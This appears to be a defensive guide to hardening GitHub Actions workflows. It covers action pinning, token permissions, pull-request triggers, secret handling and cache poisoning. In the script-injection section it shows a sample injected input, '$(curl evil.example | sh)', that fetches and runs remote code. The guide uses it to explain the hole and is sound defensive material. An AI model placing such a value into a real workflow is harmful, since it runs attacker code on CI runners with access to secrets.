# Security hardening: pins, permissions, untrusted input, secrets and caches

A workflow runs code from the repository, from every action it names, and (on a pull request) from
whoever opened the pull request. This page is the reasoning behind check-workflows' rules and the
exact way to satisfy each. Verified on 2026-10-14 against the actions' release pages, the GitHub
changelog and the Dependabot options reference.

## Contents

- The threat model in one paragraph
- Pin every action to a commit SHA
- Finding the SHA of a release
- Dependabot with a cooldown
- Least-privilege token
- pull_request, never pull_request_target
- Checkout without persisted credentials
- Script injection through ${{ }}
- Secrets live in environments
- Cache poisoning
- No soft fails, no config overrides
- Repository settings a human sets
- Re-verify

## The threat model in one paragraph

Three things can run hostile code inside a job: an action whose tag was moved to a malicious commit
(in March 2025 the tags of a popular third-party action were repointed to a commit that printed
every secret of the job into the public log), a pull request whose code or metadata reaches a job
that holds a secret or a write token, and a cache entry written by one run and restored by another.
The rules close each path: immutable pins, read-only tokens, no privileged trigger for pull requests,
untrusted text kept out of scripts, secrets only behind a protected environment, and no cache next to
a secret.

## Pin every action to a commit SHA

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

- A tag (`@v7`) or a branch (`@main`) can be moved to other code at any time; a 40-character commit
  SHA cannot. This holds for GitHub's own actions too: the pin is about immutability, not trust.
- The trailing comment names the release, so a reviewer reads `v7.0.1`, and Dependabot rewrites the
  SHA and the comment together.
- A `docker://` step pins the image digest (`@sha256:<64 hex>`). A local action (`./.github/actions/x`)
  is part of the repository and needs no pin.
- The release is at least 7 days old, like npm packages under `min-release-age=7`: a compromised
  release is usually found and pulled within days.

The pins in the templates (resolved from each release tag on 2026-10-14):

| Action | Release (published) | Commit |
|---|---|---|
| `actions/checkout` | v7.0.1 (2026-07-20) | `3d3c42e5aac5ba805825da76410c181273ba90b1` |
| `actions/setup-node` | v7.0.0 (2026-07-14); v7.1.0 of 2026-10-08 was younger than 7 days | `820762786026740c76f36085b0efc47a31fe5020` |
| `actions/cache` | v6.1.0 (2026-06-26) | `55cc8345863c7cc4c66a329aec7e433d2d1c52a9` |
| `actions/upload-artifact` | v7.0.1 (2026-04-10); v7.0.2 of 2026-10-07 was exactly at the limit | `043fb46d1a93c77aae656e7c1c64a875d1fc6a0a` |
| `actions/setup-java` (when needed) | v6.0.1 (2026-09-09) | `de7274f081f381c8f8158605e0321c36c376e2e6` |

## Finding the SHA of a release

```sh
git ls-remote --tags https://github.com/actions/checkout 'v7.0.1' 'v7.0.1^{}'
```

An annotated tag prints two lines: the tag object and, with `^{}`, the commit it points to. Pin the
commit (the `^{}` line when there is one). Check the release date on the release page before pinning.

## Dependabot with a cooldown

`templates/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
    groups:
      actions:
        patterns: ['*']
```

- `cooldown.default-days` is supported for the `github-actions` ecosystem (the `semver-*-days` keys
  are not). It applies to version updates, never to security updates, which arrive at once.
- One group keeps the weekly update to one pull request.
- npm is deliberately absent: Expo SDK packages move together through `npx expo install`
  (dependency-management); a Dependabot bump of one of them breaks the SDK alignment that
  `check:deps` enforces.
- A Dependabot pull request runs `ci.yml` like any other; it holds no secrets (Dependabot runs get
  only Dependabot secrets).

## Least-privilege token

```yaml
permissions:
  contents: read
```

at the top of every workflow. A job that needs more (for example `pull-requests: write` to post a
comment) widens its own `permissions:`, in a workflow that never runs a fork's code. `write-all`,
or a top-level `write`, gives every step of every job, every action included, the power to push
to the repository. On a pull request from a fork, the token is read-only whatever the file says;
on a same-repository pull request it is not, which is why the file says it.

## pull_request, never pull_request_target

`pull_request_target` and `workflow_run` run in the context of the base repository, with its
secrets and a write token, and are routinely combined with a checkout of the pull request's code: the
classic "pwn request". actions/checkout 7 (and the backport to every supported major from 2026-07-20)
refuses to check out a fork's head or merge commit under those events unless
`allow-unsafe-pr-checkout: true` is set. The library's rule is simpler: neither event appears in a
workflow, and that input is never set. A result that must be posted to a pull request is posted by a
person, or by a separately reviewed workflow that reads no pull request code.

## Checkout without persisted credentials

`actions/checkout` writes the job's token into `.git/config` by default so later `git push` steps
work. No step of this pipeline pushes, so `persist-credentials: false` keeps the token out of the
workspace, where any later step, script or uploaded artifact could read it.

## Script injection through ${{ }}

GitHub replaces `${{ ... }}` in a `run:` block before the shell sees the script. A branch name, a
pull request title or a workflow input such as `$(curl evil.example | sh)` then runs as code; a
secret written this way lands in the script file on the runner. Pass values through `env:` and quote
them in the script:

```yaml
- name: Start the EAS build
  run: eas build --platform "$PLATFORM" --non-interactive
  env:
    PLATFORM: ${{ inputs.platform }}
```

Inline expressions are allowed only for values a contributor cannot choose: `runner.*`, `vars.*`,
`github.sha`, `github.run_id`, `github.run_number`, `github.run_attempt`, `github.repository`,
`github.workspace`, `github.event_name`, `github.workflow`, `github.job`, and `matrix.*` when the
job's matrix is written out in the file (`os: [ubuntu-24.04, macos-26]`, not `${{ fromJSON(...) }}`).
Never inline `github.event.*`, `github.head_ref`, `github.ref_name`, `inputs.*`, `secrets.*` or step
outputs. Prefer the runner's own variables in scripts (`$GITHUB_SHA`, `$GITHUB_REF_NAME` quoted) to
any expression.

**Not `${{ env.X }}` either.** It is expanded the same way, before the shell runs, so it pastes
whatever was put into `X` into the script text. Moving `${{ github.event.pull_request.title }}` into
`env: TITLE:` and then writing `echo "${{ env.TITLE }}"` keeps the hole exactly where it was. The
variable is already in the step's environment; the script reads it as `"$TITLE"`:

```yaml
- name: Show the title
  run: echo "Title: $TITLE"            # not "${{ env.TITLE }}"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

## Secrets live in environments

- A secret is read only by a job that names `environment: <name>`. The environment (Settings >
  Environments) has required reviewers and a deployment-branch rule (`main` only), so a run on
  another branch, or a workflow edit in a pull request, cannot reach the secret without a person
  approving the run.
- Never in the workflow-level `env:`. A secret there reaches every job and every step of every run,
  pull request runs from branches of the same repository included; put it in the step `env:` of the
  one step that needs it, inside the job that names `environment:`.
- Never passed to a reusable workflow (`secrets:` map or `secrets: inherit`). A job that calls a
  reusable workflow cannot name `environment:`, so nothing guards what it passes. The called
  workflow's job names `environment: <name>` itself and reads the environment secret directly
  (GitHub's reusable-workflow docs: environment secrets cannot be passed from the caller).
- GitHub never passes secrets to `pull_request` runs from forks; same-repository pull requests get
  repository secrets, which is why none live outside an environment.
- Masking replaces a secret's exact value in the log. A transformed value (base64, a JSON field, a
  substring) is not masked: never echo, print or upload anything derived from a secret.
- Signing material (an App Store Connect key, an upload keystore) is never committed and never
  written to the workspace. When a local signing lane in CI is unavoidable, the file is written to
  `$RUNNER_TEMP` from the environment's secret and deleted in an `if: ${{ always() }}` step; the
  release skills (ios-release-testflight, android-release-play) own that procedure.

## Cache poisoning

Any run that can write a cache entry can influence a later run that restores it. Jobs without
secrets may cache (keyed on the lockfile or the pin file, [workflow-anatomy.md](workflow-anatomy.md));
a job with an environment restores none: no `actions/cache`, and `actions/setup-node` with
`package-manager-cache: false` and no `cache:` (setup-node's own README recommends this for
privileged workflows, since version 5 turns npm caching on automatically when `package.json` names
npm in `packageManager`).

## No soft fails, no config overrides

- `continue-on-error: true`, `|| true`, `|| exit 0`, `set +e` and any other `||` fallback after a
  gate command (`npm run verify || echo "verify failed"`, `npm ci || npm ci`) turn a red step green.
  A step that is allowed to fail is not a gate; delete it or fix what it reports. check-workflows
  reads the common forms one line at a time; checks.md lists what it cannot see.
- An `NPM_CONFIG_*` variable (or `npm config set`) beats the committed `.npmrc` for every npm call of
  the run: `NPM_CONFIG_MIN_RELEASE_AGE=0` silently drops the release-age policy. `check:deps` fails
  such an override; check-workflows finds it before the run.
- `npm ci` with `--force`, `--legacy-peer-deps`, `--ignore-scripts` or another `--min-release-age`
  weakens the same policy (check-ci-lanes `install-ci`).
- `LEFTHOOK: '0'` is the one switch the workflows set, and only because nothing commits on a runner.

## Repository settings a human sets

These are outside the files and need the developer (an admin) in the repository settings:

1. Settings > Actions > General: allow only actions pinned to a full commit SHA, if the plan offers
   the policy; workflow permissions "Read repository contents".
2. Settings > Environments > `production`: required reviewers, deployment branches `main`, the
   secret `EXPO_TOKEN`.
3. Settings > Branches (or rulesets) for `main`: require the `verify` check, require pull requests.
4. Settings > Code security: Dependabot security updates on.

The agent states these steps in its report; it does not change repository settings.

## Re-verify

```sh
curl -s https://api.github.com/repos/actions/checkout/releases?per_page=3 | grep -E '"(tag_name|published_at)"'
git ls-remote --tags https://github.com/actions/setup-node 'v7.0.0' 'v7.0.0^{}'
```

Read the GitHub changelog entry "Safer pull_request_target defaults for GitHub Actions checkout"
(2026-06-18) and the Dependabot options reference (`cooldown`) when either changes.
